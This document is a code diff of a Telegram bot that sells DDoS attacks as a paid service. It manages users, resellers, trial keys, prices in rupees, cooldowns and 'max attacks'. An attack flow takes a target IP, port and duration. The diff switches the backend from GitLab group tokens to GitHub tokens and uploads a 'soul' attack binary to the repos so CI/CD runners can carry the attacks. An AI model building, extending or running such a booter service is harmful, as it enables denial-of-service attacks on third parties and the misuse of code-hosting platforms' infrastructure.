-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    temp_data[user_id] = {"step": "token_file_upload"}
-    reply_markup = get_cancel_keyboard()
-    await update.message.reply_text(
-        "📤 **UPLOAD TOKEN FILE**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Please upload a .txt file with the following format:\n\n"
-        "`token1,group_id1`\n"
-        "`token2,group_id2`\n"
-        "`token3,group_id3`\n\n"
-        "Example:\n"
-        "`glpat-xxxxxxxxxxxxxxxxxxxx,12345678`\n"
-        "`glpat-yyyyyyyyyyyyyyyyyyyy,87654321`\n\n"
-        "⚡ For each valid token/group:\n"
-        "• Find or create 'soul-worker' project\n"
-        "• Upload binary file\n"
-        "• Setup CI/CD configuration\n\n"
-        "⚠️ Invalid tokens will be skipped",
-        reply_markup=reply_markup
-    )
-
-async def list_tokens(update: Update, user_id):
-    """Modified to show group_id instead of project_id"""
-    if not is_owner(user_id):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    if not gitlab_tokens:
-        await update.message.reply_text("📋 **NO TOKENS**\nNo GitLab tokens configured.")
-        return
-
-    token_list = f"📋 **CONFIGURED GROUPS** ({len(gitlab_tokens)})\n" + "━" * 25 + "\n\n"
-
-    for idx, token in enumerate(gitlab_tokens, 1):
-        group_name = token.get('group_name', 'Unknown')
-        group_id = token.get('group_id', 'Unknown')
-        project_name = token.get('project_name', 'Unknown')
-        status = token.get('status', 'unknown')
-        added_date = token.get('added_date', 'Unknown')
-
-        token_list += (
-            f"{idx}. **{group_name}**\n"
-            f"   └ Group ID: `{group_id}`\n"
-            f"   └ Project: `{project_name}`\n"
-            f"   └ Status: {status}\n"
-            f"   └ Added: {added_date}\n\n"
-        )
-
-        if idx % 10 == 0 and idx < len(gitlab_tokens):
-            token_list += "━" * 25 + "\n\n"
-
-    await update.message.reply_text(token_list[:4000])
-
-async def remove_token_start(update: Update, user_id):
-    """Modified for group-based tokens"""
-    if not is_owner(user_id):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    if not gitlab_tokens:
-        await update.message.reply_text("📋 **NO TOKENS**\nNo GitLab tokens to remove.")
-        return
-
-    token_list = "🗑️ **REMOVE TOKEN**\n" + "━" * 25 + "\n\n"
-    for idx, token in enumerate(gitlab_tokens, 1):
-        group_name = token.get('group_name', 'Unknown')
-        group_id = token.get('group_id', 'Unknown')
-        token_list += f"{idx}. {group_name} (Group ID: {group_id})\n"
-
-    token_list += f"\n━" * 25 + f"\n\nSend the number (1-{len(gitlab_tokens)}) to remove:"
-
-    temp_data[user_id] = {"step": "token_remove"}
-    reply_markup = get_cancel_keyboard()
-    await update.message.reply_text(token_list, reply_markup=reply_markup)
-
-async def remove_expired_tokens(update: Update, user_id):
-    """Modified for group-based tokens"""
-    if not is_owner(user_id):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    if not gitlab_tokens:
-        await update.message.reply_text("📋 **NO TOKENS**")
-        return
-
-    await update.message.reply_text("🔄 **CHECKING TOKENS...**")
-
-    valid_tokens = []
-    expired_tokens = []
-
-    for token_data in gitlab_tokens:
-        try:
-            gl = gitlab.Gitlab('https://gitlab.com', private_token=token_data['token'])
-            gl.auth()
-
-            # Try to access the group
-            group_id = token_data.get('group_id')
-            group = gl.groups.get(group_id)
-
-            valid_tokens.append(token_data)
-        except:
-            expired_tokens.append(token_data)
-
-    if not expired_tokens:
-        await update.message.reply_text("✅ **ALL TOKENS VALID**\nNo expired tokens found.")
-        return
-
-    gitlab_tokens.clear()
-    gitlab_tokens.extend(valid_tokens)
-    save_gitlab_tokens(gitlab_tokens)
-
-    expired_list = f"🧹 **REMOVED {len(expired_tokens)} EXPIRED TOKENS**\n" + "━" * 25 + "\n\n"
-    for token in expired_tokens[:10]:
-        group_name = token.get('group_name', 'Unknown')
-        group_id = token.get('group_id', 'Unknown')
-        expired_list += f"• `{group_name}` - Group ID: {group_id}\n"
-
-    expired_list += f"\n📊 **Remaining Tokens:** {len(valid_tokens)}"
-    await update.message.reply_text(expired_list)
-
-# ==================== USER MANAGEMENT HANDLERS (Continued from original) ====================
 
 async def add_user_start(update: Update, user_id):
     if not (is_owner(user_id) or is_admin(user_id)):
@@ -1405,8 +1116,8 @@ async def add_user_start(update: Update, user_id):
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
         "➕ **ADD USER - STEP 1/2**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send the user ID to add:\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send the User ID:\n\n"
         "Example: `123456789`",
         reply_markup=reply_markup
     )
@@ -1420,8 +1131,8 @@ async def remove_user_start(update: Update, user_id):
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
         "➖ **REMOVE USER**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send the user ID to remove:\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send the User ID to remove:\n\n"
         "Example: `123456789`",
         reply_markup=reply_markup
     )
@@ -1432,32 +1143,36 @@ async def users_list(update: Update, user_id):
         return
 
     if not approved_users:
-        await update.message.reply_text("📋 **NO APPROVED USERS**")
+        await update.message.reply_text("📭 **NO APPROVED USERS**")
         return
 
-    user_list = f"📋 **APPROVED USERS** ({len(approved_users)})\n" + "━" * 25 + "\n\n"
+    users_list_text = "👤 **APPROVED USERS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    count = 1
+    for uid, user_info in list(approved_users.items())[:15]:
+        username = user_info.get('username', f'user_{uid}')
+        days = user_info.get('days', '?')
 
-    for idx, (uid, data) in enumerate(approved_users.items(), 1):
-        username = data.get('username', 'Unknown')
-        expiry = data.get('expiry', 'Unknown')
-
+        expiry = user_info.get('expiry', 'LIFETIME')
         if expiry == "LIFETIME":
-            expiry_text = "LIFETIME"
+            remaining = "LIFETIME"
         else:
             try:
-                expiry_date = time.strftime("%Y-%m-%d", time.localtime(float(expiry)))
-                expiry_text = expiry_date
+                expiry_time = float(expiry)
+                current_time = time.time()
+                if current_time > expiry_time:
+                    remaining = "EXPIRED"
+                else:
+                    days_left = int((expiry_time - current_time) / (24 * 3600))
+                    hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
+                    remaining = f"{days_left}d {hours_left}h"
             except:
-                expiry_text = "Unknown"
+                remaining = "UNKNOWN"
 
-        user_list += f"{idx}. @{username}\n   └ ID: `{uid}`\n   └ Expiry: {expiry_text}\n\n"
+        users_list_text += f"{count}. `{uid}` - @{username} ({days} days) | {remaining}\n"
+        count += 1
 
-        if idx % 20 == 0:
-            await update.message.reply_text(user_list)
-            user_list = ""
-
-    if user_list:
-        await update.message.reply_text(user_list)
+    users_list_text += f"\n📊 **Total Users:** {len(approved_users)}"
+    await update.message.reply_text(users_list_text)
 
 async def pending_requests(update: Update, user_id):
     if not (is_owner(user_id) or is_admin(user_id)):
@@ -1465,118 +1180,177 @@ async def pending_requests(update: Update, user_id):
         return
 
     if not pending_users:
-        await update.message.reply_text("⏳ **NO PENDING REQUESTS**")
+        await update.message.reply_text("📭 **NO PENDING REQUESTS**")
         return
 
-    request_list = f"⏳ **PENDING REQUESTS** ({len(pending_users)})\n" + "━" * 25 + "\n\n"
+    pending_list = "⏳ **PENDING REQUESTS**\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    for user in pending_users[:20]:
+        pending_list += f"• `{user['user_id']}` - @{user['username']}\n"
 
-    for idx, user in enumerate(pending_users, 1):
-        username = user.get('username', 'Unknown')
-        user_id_val = user.get('user_id', 'Unknown')
-        request_date = user.get('request_date', 'Unknown')
-
-        request_list += f"{idx}. @{username}\n   └ ID: `{user_id_val}`\n   └ Date: {request_date}\n\n"
-
-    await update.message.reply_text(request_list)
+    pending_list += f"\nTo approve: Use Add User button"
+    await update.message.reply_text(pending_list)
 
 async def gen_trial_key_start(update: Update, user_id):
     if not (is_owner(user_id) or is_admin(user_id)):
         await update.message.reply_text("⚠️ **ACCESS DENIED**")
         return
 
+    # Show inline keyboard with hour options
     keyboard = [
-        [InlineKeyboardButton("6 hours", callback_data="trial_6"),
-         InlineKeyboardButton("12 hours", callback_data="trial_12"),
-         InlineKeyboardButton("24 hours", callback_data="trial_24")],
-        [InlineKeyboardButton("48 hours", callback_data="trial_48"),
-         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
+        [InlineKeyboardButton("6 Hours", callback_data="trial_6"),
+         InlineKeyboardButton("12 Hours", callback_data="trial_12"),
+         InlineKeyboardButton("24 Hours", callback_data="trial_24")],
+        [InlineKeyboardButton("48 Hours", callback_data="trial_48"),
+         InlineKeyboardButton("72 Hours", callback_data="trial_72"),
+         InlineKeyboardButton("1 Week (168h)", callback_data="trial_168")],
+        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     await update.message.reply_text(
         "🔑 **GENERATE TRIAL KEY**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Select trial duration:",
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Select duration:",
         reply_markup=reply_markup
     )
 
 async def price_list(update: Update):
     message = (
         "💰 **PRICE LIST**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "**USER PRICES:**\n"
-        "• 1 Day: ₹120\n"
-        "• 2 Days: ₹240\n"
-        "• 3 Days: ₹360\n"
-        "• 4 Days: ₹450\n"
-        "• 7 Days: ₹650\n\n"
-        "**RESELLER PRICES:**\n"
-        "• 1 Day: ₹150\n"
-        "• 2 Days: ₹250\n"
-        "• 3 Days: ₹300\n"
-        "• 4 Days: ₹400\n"
-        "• 7 Days: ₹550"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "• 1 day - ₹120\n"
+        "• 2 days - ₹240\n"
+        "• 3 days - ₹360\n"
+        "• 4 days - ₹450\n"
+        "• 7 days - ₹650\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Contact admin for access"
     )
     await update.message.reply_text(message)
 
-# ==================== OWNER MANAGEMENT (Continued) ====================
 
-async def add_owner_start(update: Update, user_id):
+# ==================== BOT SETTINGS HANDLERS ====================
+
+async def toggle_maintenance(update: Update, user_id):
     if not is_owner(user_id):
         await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    global MAINTENANCE_MODE
+    MAINTENANCE_MODE = not MAINTENANCE_MODE
+    save_maintenance_mode(MAINTENANCE_MODE)
+
+    message = (
+        f"{'🔧' if MAINTENANCE_MODE else '✅'} **MAINTENANCE MODE {'ENABLED' if MAINTENANCE_MODE else 'DISABLED'}**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"Bot is {'now under maintenance' if MAINTENANCE_MODE else 'now available for all users'}."
+    )
+
+    await update.message.reply_text(message)
+
+async def set_cooldown_start(update: Update, user_id):
+    if not is_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    # Show inline keyboard with cooldown options
+    keyboard = [
+        [InlineKeyboardButton("10s", callback_data="cooldown_10"),
+         InlineKeyboardButton("20s", callback_data="cooldown_20"),
+         InlineKeyboardButton("30s", callback_data="cooldown_30")],
+        [InlineKeyboardButton("40s", callback_data="cooldown_40"),
+         InlineKeyboardButton("60s", callback_data="cooldown_60"),
+         InlineKeyboardButton("90s", callback_data="cooldown_90")],
+        [InlineKeyboardButton("120s", callback_data="cooldown_120"),
+         InlineKeyboardButton("180s", callback_data="cooldown_180")],
+        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    await update.message.reply_text(
+        "⏱️ **SET COOLDOWN**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"Current: {COOLDOWN_DURATION}s\n\n"
+        "Select new cooldown duration:",
+        reply_markup=reply_markup
+    )
+
+async def set_max_attacks_start(update: Update, user_id):
+    if not is_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    # Show inline keyboard with max attack options
+    keyboard = [
+        [InlineKeyboardButton("1", callback_data="maxattack_1"),
+         InlineKeyboardButton("3", callback_data="maxattack_3"),
+         InlineKeyboardButton("5", callback_data="maxattack_5")],
+        [InlineKeyboardButton("10", callback_data="maxattack_10"),
+         InlineKeyboardButton("20", callback_data="maxattack_20"),
+         InlineKeyboardButton("30", callback_data="maxattack_30")],
+        [InlineKeyboardButton("40", callback_data="maxattack_40"),
+         InlineKeyboardButton("50", callback_data="maxattack_50"),
+         InlineKeyboardButton("100", callback_data="maxattack_100")],
+        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    await update.message.reply_text(
+        "🎯 **SET MAX ATTACKS**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"Current: {MAX_ATTACKS} attacks\n\n"
+        "Select maximum attacks per user:",
+        reply_markup=reply_markup
+    )
+
+async def admin_list(update: Update, user_id):
+    if not (is_owner(user_id) or is_admin(user_id)):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    if not admins:
+        await update.message.reply_text("📭 **NO ADMINS**")
+        return
+
+    admins_list = "🛡️ **ADMINS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    for admin_id, admin_info in admins.items():
+        username = admin_info.get('username', f'admin_{admin_id}')
+        admins_list += f"• `{admin_id}` - @{username}\n"
+
+    await update.message.reply_text(admins_list)
+
+
+# ==================== OWNER PANEL HANDLERS ====================
+
+async def add_owner_start(update: Update, user_id):
+    if not is_primary_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**\nOnly primary owners can add owners.")
         return
 
     temp_data[user_id] = {"step": "owner_add_id"}
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
         "👑 **ADD OWNER - STEP 1/2**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send the user ID to add as owner:\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send the User ID:\n\n"
         "Example: `123456789`",
         reply_markup=reply_markup
     )
 
 async def remove_owner_start(update: Update, user_id):
-    if not is_owner(user_id):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+    if not is_primary_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**\nOnly primary owners can remove owners.")
         return
 
     temp_data[user_id] = {"step": "owner_remove_id"}
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
         "🗑️ **REMOVE OWNER**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send the owner ID to remove:\n\n"
-        "Example: `123456789`\n\n"
-        "⚠️ Cannot remove primary owners",
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send the User ID to remove:\n\n"
+        "Example: `123456789`",
         reply_markup=reply_markup
     )
-
-async def owner_list(update: Update, user_id):
-    if not is_owner(user_id):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    if not owners:
-        await update.message.reply_text("📋 **NO OWNERS**")
-        return
-
-    owner_list_text = f"👑 **OWNERS LIST** ({len(owners)})\n" + "━" * 25 + "\n\n"
-
-    for uid, data in owners.items():
-        username = data.get('username', 'Unknown')
-        is_primary = data.get('is_primary', False)
-        added_date = data.get('added_date', 'Unknown')
-
-        owner_list_text += (
-            f"{'👑 PRIMARY' if is_primary else '👤'} @{username}\n"
-            f"   └ ID: `{uid}`\n"
-            f"   └ Added: {added_date}\n\n"
-        )
-
-    await update.message.reply_text(owner_list_text)
-
-# ==================== RESELLER MANAGEMENT (Continued) ====================
 
 async def add_reseller_start(update: Update, user_id):
     if not is_owner(user_id):
@@ -1587,8 +1361,8 @@ async def add_reseller_start(update: Update, user_id):
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
         "💰 **ADD RESELLER - STEP 1/3**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send the user ID to add as reseller:\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send the User ID:\n\n"
         "Example: `123456789`",
         reply_markup=reply_markup
     )
@@ -1602,123 +1376,53 @@ async def remove_reseller_start(update: Update, user_id):
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
         "🗑️ **REMOVE RESELLER**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send the reseller ID to remove:\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send the User ID to remove:\n\n"
         "Example: `123456789`",
         reply_markup=reply_markup
     )
 
+async def owner_list(update: Update, user_id):
+    if not (is_owner(user_id) or is_admin(user_id)):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    owners_list = "👑 **OWNERS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    for owner_id, owner_info in owners.items():
+        username = owner_info.get('username', f'owner_{owner_id}')
+        is_primary = owner_info.get('is_primary', False)
+        added_by = owner_info.get('added_by', 'system')
+        owners_list += f"• `{owner_id}` - @{username}"
+        if is_primary:
+            owners_list += " 👑 (PRIMARY)"
+        owners_list += f"\n  Added by: `{added_by}`\n"
+
+    await update.message.reply_text(owners_list)
+
 async def reseller_list(update: Update, user_id):
-    if not is_owner(user_id):
+    if not (is_owner(user_id) or is_admin(user_id)):
         await update.message.reply_text("⚠️ **ACCESS DENIED**")
         return
 
     if not resellers:
-        await update.message.reply_text("💰 **NO RESELLERS**")
+        await update.message.reply_text("📭 **NO RESELLERS**")
         return
 
-    reseller_list_text = f"💰 **RESELLERS LIST** ({len(resellers)})\n" + "━" * 25 + "\n\n"
+    resellers_list = "💰 **RESELLERS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    for reseller_id, reseller_info in resellers.items():
+        username = reseller_info.get('username', f'reseller_{reseller_id}')
+        credits = reseller_info.get('credits', 0)
+        expiry = reseller_info.get('expiry', '?')
+        if expiry != 'LIFETIME':
+            try:
+                expiry_time = float(expiry)
+                expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
+                expiry = expiry_date
+            except:
+                pass
+        resellers_list += f"• `{reseller_id}` - @{username}\n  Credits: {credits} | Expiry: {expiry}\n"
 
-    for uid, data in resellers.items():
-        username = data.get('username', 'Unknown')
-        credits = data.get('credits', 0)
-        added_date = data.get('added_date', 'Unknown')
-
-        reseller_list_text += (
-            f"💰 @{username}\n"
-            f"   └ ID: `{uid}`\n"
-            f"   └ Credits: {credits}\n"
-            f"   └ Added: {added_date}\n\n"
-        )
-
-    await update.message.reply_text(reseller_list_text)
-
-# ==================== BOT SETTINGS (Continued) ====================
-
-async def toggle_maintenance(update: Update, user_id):
-    if not (is_owner(user_id) or is_admin(user_id)):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    global MAINTENANCE_MODE
-    MAINTENANCE_MODE = not MAINTENANCE_MODE
-    save_maintenance_mode(MAINTENANCE_MODE)
-
-    status = "ON 🔴" if MAINTENANCE_MODE else "OFF 🟢"
-    await update.message.reply_text(
-        f"🔧 **MAINTENANCE MODE**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Status: {status}"
-    )
-
-async def set_cooldown_start(update: Update, user_id):
-    if not (is_owner(user_id) or is_admin(user_id)):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    keyboard = [
-        [InlineKeyboardButton("20s", callback_data="cooldown_20"),
-         InlineKeyboardButton("30s", callback_data="cooldown_30"),
-         InlineKeyboardButton("40s", callback_data="cooldown_40")],
-        [InlineKeyboardButton("60s", callback_data="cooldown_60"),
-         InlineKeyboardButton("120s", callback_data="cooldown_120"),
-         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    await update.message.reply_text(
-        "⏱️ **SET COOLDOWN**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Select cooldown duration:",
-        reply_markup=reply_markup
-    )
-
-async def set_max_attacks_start(update: Update, user_id):
-    if not (is_owner(user_id) or is_admin(user_id)):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    keyboard = [
-        [InlineKeyboardButton("1", callback_data="maxattack_1"),
-         InlineKeyboardButton("5", callback_data="maxattack_5"),
-         InlineKeyboardButton("10", callback_data="maxattack_10")],
-        [InlineKeyboardButton("20", callback_data="maxattack_20"),
-         InlineKeyboardButton("50", callback_data="maxattack_50"),
-         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    await update.message.reply_text(
-        "🎯 **SET MAX ATTACKS**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Select maximum attacks per user:",
-        reply_markup=reply_markup
-    )
-
-async def admin_list(update: Update, user_id):
-    if not (is_owner(user_id) or is_admin(user_id)):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
-
-    if not admins:
-        await update.message.reply_text("📋 **NO ADMINS**\nOnly owners configured.")
-        return
-
-    admin_list_text = f"🛡️ **ADMINS LIST** ({len(admins)})\n" + "━" * 25 + "\n\n"
-
-    for uid, data in admins.items():
-        username = data.get('username', 'Unknown')
-        added_date = data.get('added_date', 'Unknown')
-
-        admin_list_text += (
-            f"🛡️ @{username}\n"
-            f"   └ ID: `{uid}`\n"
-            f"   └ Added: {added_date}\n\n"
-        )
-
-    await update.message.reply_text(admin_list_text)
-
-# ==================== BROADCAST (Continued) ====================
+    await update.message.reply_text(resellers_list)
 
 async def broadcast_start(update: Update, user_id):
     if not is_owner(user_id):
@@ -1729,8 +1433,8 @@ async def broadcast_start(update: Update, user_id):
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
         "📢 **BROADCAST MESSAGE**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send the message to broadcast to all users:",
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send the message you want to broadcast to all users:",
         reply_markup=reply_markup
     )
 
@@ -1739,15 +1443,107 @@ async def upload_binary_start(update: Update, user_id):
         await update.message.reply_text("⚠️ **ACCESS DENIED**")
         return
 
+    if not github_tokens:
+        await update.message.reply_text("❌ **NO SERVERS AVAILABLE**\nNo servers added.")
+        return
+
     temp_data[user_id] = {"step": "binary_upload"}
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
-        "📤 **UPLOAD BINARY FILE**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send your binary file.\n"
-        "It will be uploaded to all configured groups.",
+        "📤 **BINARY UPLOAD**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send your binary file...\n"
+        "It will be uploaded to all GitHub repos as `soul` file.",
         reply_markup=reply_markup
     )
+
+
+# ==================== TOKEN MANAGEMENT HANDLERS ====================
+
+async def add_token_start(update: Update, user_id):
+    if not is_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    temp_data[user_id] = {"step": "token_add"}
+    reply_markup = get_cancel_keyboard()
+    await update.message.reply_text(
+        "➕ **ADD TOKEN**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send your GitHub token:\n\n"
+        "Example: `ghp_xxxxxxxxxxxxx`",
+        reply_markup=reply_markup
+    )
+
+async def list_tokens(update: Update, user_id):
+    if not is_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    if not github_tokens:
+        await update.message.reply_text("📭 **NO TOKENS ADDED YET**")
+        return
+
+    tokens_list = "🔑 **SERVERS LIST:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    for i, token_data in enumerate(github_tokens[:15], 1):
+        tokens_list += f"{i}. 👤 `{token_data['username']}`\n   📁 `{token_data['repo']}`\n\n"
+
+    tokens_list += f"📊 **Total Servers:** {len(github_tokens)}"
+    await update.message.reply_text(tokens_list)
+
+async def remove_token_start(update: Update, user_id):
+    if not is_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    if not github_tokens:
+        await update.message.reply_text("📭 **NO TOKENS TO REMOVE**")
+        return
+
+    temp_data[user_id] = {"step": "token_remove"}
+    reply_markup = get_cancel_keyboard()
+    await update.message.reply_text(
+        "🗑️ **REMOVE TOKEN**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"Send the token number (1-{len(github_tokens)}):\n\n"
+        "Example: `1`",
+        reply_markup=reply_markup
+    )
+
+async def remove_expired_tokens(update: Update, user_id):
+    if not is_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+        return
+
+    await update.message.reply_text("🔄 **CHECKING TOKENS...**")
+
+    valid_tokens = []
+    expired_tokens = []
+
+    for token_data in github_tokens:
+        try:
+            g = Github(token_data['token'])
+            user = g.get_user()
+            _ = user.login
+            valid_tokens.append(token_data)
+        except:
+            expired_tokens.append(token_data)
+
+    if not expired_tokens:
+        await update.message.reply_text("✅ **ALL TOKENS ARE VALID**")
+        return
+
+    github_tokens.clear()
+    github_tokens.extend(valid_tokens)
+    save_github_tokens(github_tokens)
+
+    expired_list = "🗑️ **EXPIRED TOKENS REMOVED:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    for token in expired_tokens[:10]:
+        expired_list += f"• `{token['username']}` - {token['repo']}\n"
+
+    expired_list += f"\n📊 **Remaining Tokens:** {len(valid_tokens)}"
+    await update.message.reply_text(expired_list)
+
 
 # ==================== HELP HANDLER ====================
 
@@ -1755,7 +1551,7 @@ async def help_handler(update: Update, user_id):
     if is_owner(user_id) or is_admin(user_id):
         message = (
             "🆘 **HELP - AVAILABLE FEATURES**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "**For All Users:**\n"
             "• Launch Attack - Start DDoS attack\n"
             "• Check Status - View attack status\n"
@@ -1766,35 +1562,35 @@ async def help_handler(update: Update, user_id):
             "• Bot Settings - Configure bot\n\n"
             "**Owner Features:**\n"
             "• Owner Panel - Manage owners/resellers\n"
-            "• Token Management - Manage GitLab groups\n"
-            "• Upload Token File - Bulk upload tokens\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "• Token Management - Manage GitHub tokens\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "Need help? Contact admin."
         )
     elif can_user_attack(user_id):
         message = (
             "🆘 **HELP - AVAILABLE FEATURES**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "• Launch Attack - Start DDoS attack\n"
             "• Check Status - View attack status\n"
             "• Stop Attack - Stop running attack\n"
             "• My Access - Check your access info\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "Need help? Contact admin."
         )
     else:
         message = (
             f"🆘 **HELP**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "**To Get Access:**\n"
-            "1. Use /start to request\n"
+            "1. Use start to request\n"
             "2. Contact admin\n"
             "3. Wait for approval\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"**Your ID:** `{user_id}`"
         )
 
     await update.message.reply_text(message)
+
 
 # ==================== TEXT INPUT HANDLER ====================
 
@@ -1819,7 +1615,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         temp_data[user_id] = {"step": "attack_port", "ip": ip, "method": method}
         await update.message.reply_text(
             "🎯 **LAUNCH ATTACK - STEP 2/3**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"✅ IP: `{ip}`\n\n"
             "Send the target PORT:\n\nExample: `80` or `443`"
         )
@@ -1840,15 +1636,14 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                  InlineKeyboardButton("60s", callback_data="attack_time_60"),
                  InlineKeyboardButton("90s", callback_data="attack_time_90")],
                 [InlineKeyboardButton("120s", callback_data="attack_time_120"),
-                 InlineKeyboardButton("180s", callback_data="attack_time_180"),
-                 InlineKeyboardButton("300s", callback_data="attack_time_300")],
+                 InlineKeyboardButton("180s", callback_data="attack_time_180")],
                 [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
 
             await update.message.reply_text(
                 "🎯 **LAUNCH ATTACK - STEP 3/3**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ IP: `{temp_data[user_id]['ip']}`\n"
                 f"✅ Port: `{port}`\n\n"
                 "Select attack duration:",
@@ -1880,7 +1675,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
 
             await update.message.reply_text(
                 "➕ **ADD USER - STEP 2/2**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ User ID: `{new_user_id}`\n\n"
                 "Select duration:",
                 reply_markup=reply_markup
@@ -1913,7 +1708,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 reply_markup = get_main_keyboard(user_id)
                 await update.message.reply_text(
                     f"✅ **USER ACCESS REMOVED**\n"
-                    "━━━━━━━━━━━━━━━━━━━━━\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"User ID: `{user_to_remove}`\n"
